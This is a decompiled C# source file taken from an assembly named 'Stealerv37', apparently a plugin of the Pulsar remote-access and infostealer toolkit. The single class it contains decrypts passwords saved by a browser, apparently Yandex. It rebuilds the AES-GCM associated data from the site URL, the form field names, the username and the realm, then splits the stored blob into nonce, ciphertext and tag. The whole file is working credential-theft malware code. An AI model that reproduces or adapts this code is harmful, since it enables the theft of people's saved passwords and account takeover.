// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.YaAuthenticatedData
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class YaAuthenticatedData
{
  public static byte[] Decrypt(
    byte[] encryptionKey,
    byte[] password_value,
    string url,
    string username_element,
    string password_element,
    string username_value,
    string signon_realm)
  {
    byte[] aad = new byte[0];
    using (SHA1 shA1 = SHA1.Create())
    {
      byte[] bytes1 = Encoding.UTF8.GetBytes(url);
      byte[] bytes2 = Encoding.UTF8.GetBytes(username_element);
      byte[] bytes3 = Encoding.UTF8.GetBytes(username_value);
      byte[] bytes4 = Encoding.UTF8.GetBytes(password_element);
      byte[] bytes5 = Encoding.UTF8.GetBytes(signon_realm);
      byte[] numArray1 = new byte[bytes1.Length + 1 + bytes2.Length + 1 + bytes3.Length + 1 + bytes4.Length + 1 + bytes5.Length];
      int destinationIndex1 = 0;
      Array.Copy((Array) bytes1, 0, (Array) numArray1, destinationIndex1, bytes1.Length);
      int num1 = destinationIndex1 + bytes1.Length;
      byte[] numArray2 = numArray1;
      int index1 = num1;
      int destinationIndex2 = index1 + 1;
      numArray2[index1] = (byte) 0;
      Array.Copy((Array) bytes2, 0, (Array) numArray1, destinationIndex2, bytes2.Length);
      int num2 = destinationIndex2 + bytes2.Length;
      byte[] numArray3 = numArray1;
      int index2 = num2;
      int destinationIndex3 = index2 + 1;
      numArray3[index2] = (byte) 0;
      Array.Copy((Array) bytes3, 0, (Array) numArray1, destinationIndex3, bytes3.Length);
      int num3 = destinationIndex3 + bytes3.Length;
      byte[] numArray4 = numArray1;
      int index3 = num3;
      int destinationIndex4 = index3 + 1;
      numArray4[index3] = (byte) 0;
      Array.Copy((Array) bytes4, 0, (Array) numArray1, destinationIndex4, bytes4.Length);
      int num4 = destinationIndex4 + bytes4.Length;
      byte[] numArray5 = numArray1;
      int index4 = num4;
      int destinationIndex5 = index4 + 1;
      numArray5[index4] = (byte) 0;
      Array.Copy((Array) bytes5, 0, (Array) numArray1, destinationIndex5, bytes5.Length);
      aad = shA1.ComputeHash(numArray1);
    }
    byte[] numArray6 = new byte[12];
    Array.Copy((Array) password_value, 0, (Array) numArray6, 0, 12);
    int length = password_value.Length - 12 - 16 /*0x10*/;
    byte[] numArray7 = new byte[length];
    Array.Copy((Array) password_value, 12, (Array) numArray7, 0, length);
    byte[] numArray8 = new byte[16 /*0x10*/];
    Array.Copy((Array) password_value, password_value.Length - 16 /*0x10*/, (Array) numArray8, 0, 16 /*0x10*/);
    return AesGcm256.Decrypt(encryptionKey, numArray6, aad, numArray7, numArray8);
  }
}
